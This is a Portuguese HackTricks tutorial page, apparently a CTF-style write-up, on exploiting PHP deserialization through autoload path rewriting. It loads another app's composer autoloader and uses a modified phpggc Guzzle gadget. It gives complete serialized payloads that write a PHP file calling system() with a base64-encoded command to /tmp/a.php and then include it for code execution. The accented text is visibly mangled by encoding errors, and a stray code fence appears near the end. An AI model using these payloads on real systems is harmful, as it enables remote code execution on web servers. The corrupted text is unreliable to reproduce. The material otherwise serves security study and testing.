# PHP - Deserializa√ß√£o + Classes Autoload

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

Primeiro, voc√™ deve verificar o que s√£o [**Classes Autoload**](https://www.php.net/manual/en/language.oop5.autoload.php).

## Deserializa√ß√£o PHP + spl\_autoload\_register + LFI/Gadget

Estamos em uma situa√ß√£o onde encontramos uma **deserializa√ß√£o PHP em uma webapp** sem nenhuma biblioteca vulner√°vel a gadgets dentro do **`phpggc`**. No entanto, no mesmo container havia uma **webapp composer diferente com bibliotecas vulner√°veis**. Portanto, o objetivo era **carregar o carregador do composer da outra webapp** e abusar dele para **carregar um gadget que explorar√° essa biblioteca com um gadget** da webapp vulner√°vel √† deserializa√ß√£o.

Passos:

* Voc√™ encontrou uma **deserializa√ß√£o** e **n√£o h√° nenhum gadget** no c√≥digo atual do app
* Voc√™ pode abusar de uma fun√ß√£o **`spl_autoload_register`** como a seguinte para **carregar qualquer arquivo local com extens√£o `.php`**
* Para isso, voc√™ usa uma deserializa√ß√£o onde o nome da classe vai estar dentro de **`$name`**. Voc√™ **n√£o pode usar "/" ou "."** em um nome de classe em um objeto serializado, mas o **c√≥digo** est√° **substituindo** os **sublinhados** ("\_") **por barras** ("/"). Ent√£o, um nome de classe como `tmp_passwd` ser√° transformado em `/tmp/passwd.php` e o c√≥digo tentar√° carreg√°-lo.\
Um **exemplo de gadget** seria: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
Se voc√™ tem um **upload de arquivo** e pode enviar um arquivo com a extens√£o **`.php`**, voc√™ poderia **abusar dessa funcionalidade diretamente** e obter RCE imediatamente.
{% endhint %}

No meu caso, eu n√£o tinha nada assim, mas havia dentro do **mesmo container** outra p√°gina web do composer com uma **biblioteca vulner√°vel a um gadget `phpggc`**.

* Para carregar essa outra biblioteca, primeiro voc√™ precisa **carregar o carregador do composer daquela outra aplica√ß√£o web** (porque o da aplica√ß√£o atual n√£o acessar√° as bibliotecas da outra.) **Conhecendo o caminho da aplica√ß√£o**, voc√™ pode conseguir isso muito facilmente com: **`O:28:"www_frontend_vendor_autoload":0:{}`** (No meu caso, o carregador do composer estava em `/www/frontend/vendor/autoload.php`)
* Agora, voc√™ pode **carregar** o carregador do composer da outra **aplica√ß√£o**, ent√£o √© hora de **`gerar o payload do phpgcc`** para usar. No meu caso, eu usei **`Guzzle/FW1`**, que me permitiu **escrever qualquer arquivo dentro do sistema de arquivos**.
* NOTA: O **gadget gerado n√£o estava funcionando**, para que funcionasse eu **modifiquei** aquele payload **`chain.php`** do phpggc e defini **todos os atributos** das classes **de privados para p√∫blicos**. Caso contr√°rio, ap√≥s a desserializa√ß√£o da string, os atributos dos objetos criados n√£o tinham valores.
* Agora temos a maneira de **carregar o carregador do composer da outra aplica√ß√£o** e temos um **payload do phpggc que funciona**, mas precisamos **fazer isso na MESMA REQUISI√á√ÉO para que o carregador seja carregado quando o gadget for usado**. Para isso, eu enviei um array serializado com ambos os objetos como:
* Voc√™ pode ver **primeiro o carregador sendo carregado e depois o payload**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* Agora, podemos **criar e escrever um arquivo**, no entanto, o usu√°rio **n√£o poderia escrever em nenhuma pasta dentro do servidor web**. Ent√£o, como voc√™ pode ver no payload, PHP chamando **`system`** com algum **base64** √© criado em **`/tmp/a.php`**. Depois, podemos **reutilizar o primeiro tipo de payload** que usamos como LFI para carregar o carregador do compositor de outro webapp **para carregar o arquivo gerado `/tmp/a.php`**. Basta adicion√°-lo ao gadget de deserializa√ß√£o:&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
```markdown
{% endcode %}

**Resumo do payload**

* **Carregar o autoload do composer** de um webapp diferente no mesmo cont√™iner
* **Carregar um gadget do phpggc** para abusar de uma biblioteca do outro webapp (o webapp inicial vulner√°vel √† deserializa√ß√£o n√£o tinha nenhum gadget em suas bibliotecas)
* O gadget ir√° **criar um arquivo com um payload PHP** nele em /tmp/a.php com comandos maliciosos (o usu√°rio do webapp n√£o pode escrever em nenhuma pasta de nenhum webapp)
* A parte final do nosso payload usar√° **carregar o arquivo php gerado** que executar√° comandos

Eu precisei **chamar essa deserializa√ß√£o duas vezes**. Nos meus testes, na primeira vez o arquivo `/tmp/a.php` foi criado mas n√£o carregado, e na segunda vez ele foi corretamente carregado.

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
